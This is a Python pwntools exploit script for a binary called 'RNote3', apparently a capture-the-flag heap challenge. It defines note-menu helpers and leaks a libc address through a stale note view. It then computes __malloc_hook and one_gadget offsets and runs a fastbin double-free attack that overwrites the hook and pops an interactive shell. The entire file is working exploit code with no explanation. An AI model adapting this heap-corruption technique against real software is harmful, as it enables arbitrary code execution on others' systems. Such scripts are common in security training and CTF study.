#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./RNote3')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()

def alloc(title, size, content):
    io.sendline('1')

    if len(title) < 8:
        title += '\n'
    io.sendafter('title: ', title)
    io.sendlineafter('size: ', str(size))

    if len(content) < size:
        content += '\n'
    io.sendafter('content: ', content)

def view(title):
    io.sendline('2')
    if len(title) < 8:
        title += '\n'
    io.sendafter('title: ', title)


def edit(title, data):
    io.sendline('3')
    if len(title) < 8:
        title += '\n'
    io.sendafter('title: ', title)
    io.sendlineafter('content: ', data)

def free(title):
    io.sendline('4')
    if len(title) < 8:
        title += '\n'
    io.sendafter('title: ', title)

def leak(data):
    view(data)
    io.recvuntil('content: ')
    return u64(io.recv(8)[0:6].ljust(8,b"\x00"))

def menu():
    io.recvuntil('Exit\n')


one = [0x45226,0x4527a,0xf03a4,0xf1247]

menu()
alloc('A'*8, 0x80, 'A'*8) # 0
alloc('B'*8, 0x68, 'B'*8) # 

view('A'*8)
free('222')
view("\x00\x00\x00\x00\x00\x00\x00\x00")

io.recvuntil('content: ')
addr = u64(io.recv(8)[0:6].ljust(8,b"\x00"))

libc        = addr - 0x3c4b78
malloc_hook = libc + 0x3c4b10 - 0x23
system = libc + 0x453a0
magic       = libc + one[2]

lg("libc",libc)
alloc('C'*8, 0x68, 'C'*8) # 2=
view('C'*8)
free('kek')
edit(p8(0).decode("iso-8859-1"), p64(malloc_hook).decode("iso-8859-1"))
alloc('D'*8, 0x68, 'D'*8) # 3
alloc('E'*8, 0x68, (b'\x00'*0x13 + p64(magic)).decode("iso-8859-1") )
view('D'*8)

free('kek')
input()
free('kek')

io.interactive()



